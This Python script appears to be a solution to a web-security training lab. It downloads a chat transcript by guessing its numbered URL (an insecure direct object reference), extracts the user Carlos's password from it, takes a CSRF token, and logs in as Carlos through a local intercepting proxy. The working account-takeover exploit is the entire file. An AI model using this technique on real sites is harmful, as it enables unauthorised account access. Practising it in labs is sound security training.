import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_carlos_password(s, url):
    chat_url = url + "/download-transcript/1.txt"
    r = s.get(chat_url, verify=False, proxies=proxies)
    res = r.text
    if "password" in res:
        print("[+] Found Carlos's password!")
        carlos_password = re.findall(r'password is (.*)\.', res)
        return carlos_password[0]
    else:
        print("[-] Unabled to find Carlos's password.")
        sys.exit(-1)



def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def carlos_login(s, url, carlos_password):
    #Get csrf token
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #login as carlos
    data_login = {"username": "carlos", "password": carlos_password, "csrf": csrf_token}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("[+] Successfully logged in as Carlos!")
    else:
        print("[-] Unable to login as carlos.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    carlos_password = get_carlos_password(s, url)

    #Login to carlos account
    print("[+] Logging into Carlos's account...")
    carlos_login(s, url, carlos_password)


if __name__ == "__main__":
    main() 